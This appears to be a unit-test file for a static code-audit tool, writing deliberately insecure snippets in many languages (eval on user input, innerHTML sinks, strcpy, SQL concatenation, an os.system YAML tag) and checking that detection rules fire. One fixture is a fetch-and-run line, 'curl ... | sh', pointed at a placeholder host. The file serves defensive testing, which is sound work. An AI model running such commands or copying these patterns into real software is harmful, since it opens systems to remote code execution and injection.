import tempfile
import unittest
from pathlib import Path

from auto_find_bug.code_audit import analyze_source, write_code_report


class CodeAuditTests(unittest.TestCase):
    def test_detects_python_dynamic_execution_and_unsafe_yaml(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sample.py"
            path.write_text("eval(user_input)\nyaml.load(data)\n", encoding="utf-8")
            result = analyze_source(tmp)
        rules = {item["rule_id"] for item in result["findings"]}
        self.assertIn("PY001", rules)
        self.assertIn("PY004", rules)
        self.assertEqual(result["files_scanned"], 1)

    def test_detects_javascript_html_sink(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "app.js").write_text("node.innerHTML = value;\neval(code);\n", encoding="utf-8")
            result = analyze_source(tmp)
        rules = {item["rule_id"] for item in result["findings"]}
        self.assertIn("JS001", rules)
        self.assertIn("JS002", rules)

    def test_skips_dependency_directories(self):
        with tempfile.TemporaryDirectory() as tmp:
            vendor = Path(tmp) / "node_modules"
            vendor.mkdir()
            (vendor / "bad.js").write_text("eval(code)", encoding="utf-8")
            result = analyze_source(tmp)
        self.assertEqual(result["files_scanned"], 0)
        self.assertEqual(result["finding_count"], 0)


    def test_detects_multiple_language_families(self):
        samples = {
            "unsafe.c": "char *x; strcpy(x, input);",
            "unsafe.cs": "Process.Start(command);",
            "unsafe.java": "new ObjectInputStream(input);",
            "unsafe.rs": "unsafe { *ptr = 1; }",
            "unsafe.sol": "require(tx.origin == owner);",
            "unsafe.pas": "GetMem(buffer, size);",
            "unsafe.sh": "curl https://example.invalid/script.sh | sh",
            "unsafe.bat": "call %USER_COMMAND%",
            "unsafe.sql": "EXECUTE('SELECT ' + user_value);",
        }
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for name, source in samples.items():
                (root / name).write_text(source, encoding="utf-8")
            result = analyze_source(root)
        rules = {item["rule_id"] for item in result["findings"]}
        self.assertTrue({"C001", "CS001", "JAVA002", "RS001", "SOL001", "PAS001", "SH002", "BAT001", "SQL001"}.issubset(rules))
        self.assertGreaterEqual(result["language_count"], 9)

    def test_validates_json_and_scans_configuration_formats(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "settings.json").write_text('{"debug": true, "cors": "*"}', encoding="utf-8")
            (root / "broken.xml").write_text("<root>", encoding="utf-8")
            (root / "unsafe.yaml").write_text("payload: !!python/object/apply:os.system", encoding="utf-8")
            result = analyze_source(root)
        rules = {item["rule_id"] for item in result["findings"]}
        self.assertIn("CFG001", rules)
        self.assertIn("CFG002", rules)
        self.assertIn("DATA001", rules)
        self.assertIn("YAML001", rules)

    def test_writes_json_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "src"
            root.mkdir()
            (root / "x.py").write_text("eval(x)", encoding="utf-8")
            result = analyze_source(root)
            output = write_code_report(result, Path(tmp) / "report.json", "json")
            self.assertIn("PY001", output.read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
